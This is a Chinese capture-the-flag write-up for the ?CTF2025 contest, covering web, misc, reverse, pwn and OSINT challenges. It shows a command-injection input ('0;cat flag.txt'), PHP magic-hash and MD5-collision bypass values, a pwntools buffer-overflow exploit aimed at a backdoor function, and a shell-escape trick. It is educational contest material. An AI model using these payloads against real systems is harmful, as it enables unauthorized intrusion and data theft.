---
date: '2026-01-26T22:48:16+08:00'
draft: false
title: '?CTF2025 WP'
summary: '？CTF（ilovectf）部分Wp' 
---
# Week1

## Web

### Gitttttttt

打开题目后是静态页面。目录扫描看看。

![image-20251004111308692](imgs/image-20251004111308692.png)

![image-20251004111254391](imgs/image-20251004111254391.png)

再结合题目名称怀疑是git泄露

![image-20251004111239375](imgs/image-20251004111239375.png)

### from_http

按照提示一步步修改得到flag

只能从?CTF来 改 Referer

只能从本地访问 改 X-Forwarded-For

使用?CTF浏览器 改 User-Agent

![image-20251004111716803](imgs/image-20251004111716803.png)

### Ping??

输入0;ls

![image-20251004113929437](imgs/image-20251004113929437.png)

看见flag.txt，输入0;cat flag.txt

![image-20251004114119385](imgs/image-20251004114119385.png)

这里可能过滤flag，使用cat f*试试能不能绕过

![image-20251004114210080](imgs/image-20251004114210080.png)

拿到flag



### secret of php

分析代码 知a的值不能为字符串2025，而且intval转换后必须是数字2025

![image-20251004114330823](imgs/image-20251004114330823.png)

传a的值为03751 八进制数

![image-20251004114709483](imgs/image-20251004114709483.png)

来到下一关，分析代码首先a不等于b，并且md5值需要相同，这里使用a=s1502113478a&b=s1885207154a md5后值为0e开头的值绕过

![image-20251004114831485](imgs/image-20251004114831485.png)

第二个数组绕过`(string)$a` → `"Array"`和 `(string)$b` → `"Array"` 这样md5后的结果是一致的

，第三个md5碰撞

```
aaa=%d1%31%dd%02%c5%e6%ee%c4%69%3d%9a%06%98%af%f9%5c%2f%ca%b5%87%12%46%7e%ab%40%04%58%3e%b8%fb%7f%89%55%ad%34%06%09%f4%b3%02%83%e4%88%83%25%71%41%5a%08%51%25%e8%f7%cd%c9%9f%d9%1d%bd%f2%80%37%3c%5b%d8%82%3e%31%56%34%8f%5b%ae%6d%ac%d4%36%c9%19%c6%dd%53%e2%b4%87%da%03%fd%02%39%63%06%d2%48%cd%a0%e9%9f%33%42%0f%57%7e%e8%ce%54%b6%70%80%a8%0d%1e%c6%98%21%bc%b6%a8%83%93%96%f9%65%2b%6f%f7%2a%70
&bbb=%d1%31%dd%02%c5%e6%ee%c4%69%3d%9a%06%98%af%f9%5c%2f%ca%b5%07%12%46%7e%ab%40%04%58%3e%b8%fb%7f%89%55%ad%34%06%09%f4%b3%02%83%e4%88%83%25%f1%41%5a%08%51%25%e8%f7%cd%c9%9f%d9%1d%bd%72%80%37%3c%5b%d8%82%3e%31%56%34%8f%5b%ae%6d%ac%d4%36%c9%19%c6%dd%53%e2%34%87%da%03%fd%02%39%63%06%d2%48%cd%a0%e9%9f%33%42%0f%57%7e%e8%ce%54%b6%70%80%28%0d%1e%c6%98%21%bc%b6%a8%83%93%96%f9%65%ab%6f%f7%2a%70
```

![image-20251004120929209](imgs/image-20251004120929209.png)

得到flag

### 前端小游戏

打开题目后查看游戏源码

![image-20251004122850338](imgs/image-20251004122850338.png)

解base64得到flag

![image-20251004122948869](imgs/image-20251004122948869.png)

### 包含不明东西的食物？！

打开题目，发现让我投入食材那就试试

![image-20251004123256637](imgs/image-20251004123256637.png)

![image-20251004123244991](imgs/image-20251004123244991.png)

怀疑存在文件包含漏洞

![image-20251004123416657](imgs/image-20251004123416657.png)

查看页面源码发现提示

![image-20251004123711896](imgs/image-20251004123711896.png)

![image-20251004123702271](imgs/image-20251004123702271.png)

## Misc

### 《关于我穿越到CTF的异世界这档事:序》

将alphabet.txt文件的内容base64解码得到了提示

![image-20251004140841437](imgs/image-20251004140841437.png)

“钥匙从未远离过；它平静地存在于文本本身之中。”，搜索了下base64隐写，发现隐写特征和这个文本大致相同，去github找了找base64隐写的脚本，提取出可能是密钥之类的东西，后面发现是换表base8

![image-20251005131650444](imgs/image-20251005131650444.png)

写脚本

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
自定义 Base8 解码器（纯解码，不再尝试 base64）
支持：
 - 自定义 8 字符映射集
 - 忽略填充字符（默认 '='）
"""

import argparse
import sys

def base8_decode(encoded: str, charset: str, pad_char: str = '=') -> bytes:
    if len(charset) != 8:
        raise ValueError("映射字符集长度必须为 8 个字符。")
    if len(set(charset)) != 8:
        raise ValueError("映射字符集中含重复字符，请确保 8 个字符互不相同。")

    mapping = {ch: i for i, ch in enumerate(charset)}
    # 去除空白和填充字符
    cleaned = "".join(ch for ch in encoded if not ch.isspace() and ch != pad_char)

    # 将每个符号映射为 3 位二进制并拼接
    bits = []
    for ch in cleaned:
        if ch not in mapping:
            raise ValueError(f"遇到未知字符: {ch!r}（不在映射字符集中）。")
        bits.append(f"{mapping[ch]:03b}")
    bitstr = "".join(bits)

    # 每 8 位组成一个字节（丢弃尾端不足 8 位的）
    out = bytearray()
    for i in range(0, (len(bitstr) // 8) * 8, 8):
        out.append(int(bitstr[i:i+8], 2))
    return bytes(out)

def main():
    parser = argparse.ArgumentParser(description="自定义 Base8 解码器（纯解码版）")
    parser.add_argument('-m', '--mapping', help="8 字符映射集，例如: ?CTFmisc")
    parser.add_argument('-s', '--string', help="直接传入密文字符串")
    parser.add_argument('-f', '--file', help="从文件读取密文")
    parser.add_argument('-p', '--pad', default='=', help="填充字符（默认 '='）")
    args = parser.parse_args()

    mapping = args.mapping or input("请输入映射字符集（8 个字符）: ").strip()
    if not args.string and not args.file:
        encoded = input("请输入密文（可以包含填充 '='+）: ").strip()
    elif args.file:
        with open(args.file, 'r', encoding='utf-8') as f:
            encoded = f.read()
    else:
        encoded = args.string

    try:
        decoded = base8_decode(encoded, mapping, pad_char=args.pad)
    except Exception as e:
        print("解码失败:", e, file=sys.stderr)
        sys.exit(1)

    print("解码后 bytes (hex):", decoded.hex())
    try:
        print("解码后 (utf-8):", decoded.decode('utf-8'))
    except Exception:
        print("解码后 (utf-8, replace):", decoded.decode('utf-8', errors='replace'))

if __name__ == '__main__':
    main()
```

![image-20251005145437090](imgs/image-20251005145437090.png)

解得ZmxhZ3tUaDNfUHIxbmMxcGwzXzBmX0Jhc2VfMXNfUzBfRXp6fQ==，base64解码

flag{Th3_Pr1nc1pl3_0f_Base_1s_S0_Ezz}



### 布豪有黑客(一)

拿到一个流量包，导出http对象，就能看见压缩包和密码文件

![image-20251004140501232](imgs/image-20251004140501232.png)

密码是?CTF2025，解压flag.zip后拿到flag{Wireshark_1s_4wes0m3}

### 俱乐部之旅(1) - 邀请函

010打开找找，发现末尾多了这样的字符串，结合题目名称猜测可能是压缩包的密码是c5im加上4个字符，这里可以尝试爆破

![image-20251004142049262](imgs/image-20251004142049262.png)

使用工具掩码攻击

![image-20251004142354215](imgs/image-20251004142354215.png)

解压后打开steg.docx文档发现是空白的，怀疑可能是文字被隐藏，ctrl+a全选，复制到记事本里发现是

![image-20251004142756809](imgs/image-20251004142756809.png)

复制一份docx文档改后缀名为zip解压

![image-20251004142842062](imgs/image-20251004142842062.png)

发现一个奇怪的文件，打开后发现是2657656c63306d655f74305f7468335f6335696d5f433175627d

尝试16进制转ascii

![image-20251004142954375](imgs/image-20251004142954375.png)

这里拿到flag的后半部分，继续找，发现有可疑的地方

![image-20251004150047812](imgs/image-20251004150047812.png)

这里是使用7位2进制表示字符，使用cyberchef解决

![image-20251004150200671](imgs/image-20251004150200671.png)

flag{W0rd_5t3g_is_1z将flag拼接起来flag{W0rd_5t3g_is_1z&Welc0me_t0_th3_c5im_C1ub}

### 文化木的侦探委托(一)

打开是一张图片，修复高度后发现提示

![image-20251004212308165](imgs/image-20251004212308165.png)

找到flag

![image-20251004212547939](imgs/image-20251004212547939.png)

### 维吉尼亚朋友的来信

拿到一个音频用工具打开后先看看波形图，没有发现异常，看看频谱图

![image-20251004213343267](imgs/image-20251004213343267.png)



key{deepsound}，去搜了一下deepsound好像是个隐写工具

![image-20251004220413045](imgs/image-20251004220413045.png)

给XX.txt提取出来

![image-20251004220442855](imgs/image-20251004220442855.png)

猜测是维吉尼亚密码，使用前面的密钥解密

![image-20251004220725107](imgs/image-20251004220725107.png)

得到flag{funny_letter_to_you}



## Reverse

### PlzDebugMe

拿到exe后IDA打开找字符串flag引用，反编译窗口

![image-20251004235514497](imgs/image-20251004235514497.png)

看加密逻辑，这里的s是123456，最后返回结果是0x1F97

```c
  s = 1103515245 * 123456 + 12345;
  return HIWORD(s) & 0x7FFF;
```

![image-20251005002325466](imgs/image-20251005002325466.png)

这里是unsigned int8 所以应该是0x97 ^ a1

![image-20251005002304444](imgs/image-20251005002304444.png)

提取出密文

![image-20251005002715554](imgs/image-20251005002715554.png)



## Pwn

### ncncnc

这里尝试了好几种方式，发现都不行，尝试使用$0 这个特殊变量 表示当前正在执行的脚本或命令的名称

在没有执行脚本是一般$0为zsh或bash，这样$0 就会开启一个新的shell环境没有之前限制

![image-20251004185429076](imgs/image-20251004185429076.png)

### count

先nc连接看看有没有什么规律，这里发现第一次的问题是固定了，后面就都是16进制的算数，回复的答案也必须是16进制

![image-20251004193548655](imgs/image-20251004193548655.png)

这里可以写脚本解决

```py
# nc连接后出现计算题
from pwn import *
context.log_level = 'debug'
p = remote("challenge.ilovectf.cn", 30667)
p.sendlineafter("2025x2025=?\n", "4100625")
p.recvuntil(b'ready?\n')
for i in range(0, 20):
    str1 = p.recv().strip().strip(b'?').strip().strip(b'=').decode()
    result = str(hex(eval(str1))).encode()
    p.sendline(result)
    str2 = p.recvline().decode()

p.interactive()

```

![image-20251004200607706](imgs/image-20251004200607706.png)

### 勇者救公主

nc 连接后一步步操作

![image-20251004205124358](imgs/image-20251004205124358.png)



### 危险的 gets

![image-20251004210420666](imgs/image-20251004210420666.png)

用IDA先看看代码逻辑

![image-20251004210512608](imgs/image-20251004210512608.png)

gets函数这里存在溢出

![image-20251004210529159](imgs/image-20251004210529159.png)

找后门函数

![image-20251004210606306](imgs/image-20251004210606306.png)

写exp

```py
from pwn import *
p = remote("challenge.ilovectf.cn", 30835)
# p = process('./gets')
elf = ELF('./gets')
offset = 72

backdoor_addr = elf.symbols['backdoor']
payload = offset * b'a' + p64(backdoor_addr+5)
p.recv()
p.sendline(payload)
p.interactive()
```

打本地

![image-20251004211226275](imgs/image-20251004211226275.png)

![image-20251004211406241](imgs/image-20251004211406241.png)





## osint

### Task 1. 见面地点

通过GPS确定是在郑州，图片百度识图

![image-20251004191136962](imgs/image-20251004191136962.png)

![image-20251004191214253](imgs/image-20251004191214253.png)

能确定是郑州如意湖，需要找到距目的地直线距离最近的地铁站点，以及经过该站点的线路。
flag以flag{线路号_站点名}的形式给出，站点名为首字母大写的拼音形式

![image-20251004192022166](imgs/image-20251004192022166.png)

应该是会展中心1号线-4号线

![image-20251004192220473](imgs/image-20251004192220473.png)

应该是flag{1_4_HuiZhanZhongXin}



# Week2

## Web

### Look at the picture

本以为是ssrf，试了好久没啥用，目录扫描，www.zip拿到源码

![image-20251014184655784](imgs/image-20251014184655784.png)

![image-20251014184714226](imgs/image-20251014184714226.png)

php://filter 不支持rot47，但是`php://filter` 指定一个不存在的过滤器，PHP 会忽略这个过滤器，直接返回原始数据流。这里采取这种方式绕过

![image-20251014184418805](imgs/image-20251014184418805.png)



### 留言板

![image-20251012170245278](imgs/image-20251012170245278.png)

测试发现ssti漏洞，直接fenjing

![image-20251012173928067](imgs/image-20251012173928067.png)

![image-20251012174036439](imgs/image-20251012174036439.png)



### Only Picture Up

![image-20251012183929224](imgs/image-20251012183929224.png)

怀疑是文件上传+文件包含，先试试，上传图片马，点击预览，尝试命令执行

![image-20251012184140742](imgs/image-20251012184140742.png)

去看这个文件，拿到flag

![image-20251012184246164](imgs/image-20251012184246164.png)



### 这是什么函数

目录扫描发现src路由和flag路由

![image-20251012185835332](imgs/image-20251012185835332.png)

访问src路由拿到源码

![image-20251012190046435](imgs/image-20251012190046435.png)

分析代码看出是原型链污染

![image-20251012190816082](imgs/image-20251012190816082.png)

拿到flag

![image-20251012190825635](imgs/image-20251012190825635.png)

### Regular Expression

![image-20251012192332194](imgs/image-20251012192332194.png)

首先?要求

```
长度检查：
字符串总长 40 字符（-ctf< 5 + \n 1 + >>>>> 5 + h12 3 + !!!!!!!!!! 10 + @email.com 10 +   1 + flag0 5 = 40），
满足 strlen($_？) == 40

正则匹配 /^-(ctf|CTF)<\n>{5}[h-l]\d\d\W+@email\.com flag.\b$/：
^ - (ctf|CTF)：匹配开头 -ctf（小写 ctf 符合）。
< \n > {5}：匹配 < + 换行符 \n + 五个 >（即 >>>>>）。
[h-l]：匹配 h（h 到 l 范围）。
\d \d：匹配 12（两个数字）。
\W+：匹配 !!!!!!!!!!（10 个 !，非单词字符）。
@email\.com：精确匹配 @email.com（注意 . 转义为 \.）。
 flag.：匹配空格 + flag + 任意字符（这里 . 匹配 0）。
\b $：单词边界 + 结尾（0 是单词字符，\b 在末尾有效）。
```

-ctf%3C%0A%3E%3E%3E%3E%3Eh12%21%21%21%21%21%21%21%21%21%21%40email.com%20flag0

preg=||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||

```
长度检查：preg 值为 80 个 ，满足 strlen($_POST['preg']) > 77。
正则处理：$preg = str_replace("|", "", $_POST['preg']); 将所有  移除，得到空字符串 ''。
匹配执行：preg_match('/' . $preg . '/', $test_string) 变成 preg_match('//', $test_string)。

在 PHP 的 PCRE 引擎中，空正则模式 // 会匹配字符串开头的空子串（empty match at position 0）。
测试字符串 $test_string = 'Please\ 777give+. !me?<=-=>(.*)Flaggg0';
非空，因此匹配成功，返回 1
```

![image-20251012195817190](imgs/image-20251012195817190.png)

python写脚本一键去获取flag

![image-20251012195638697](imgs/image-20251012195638697.png)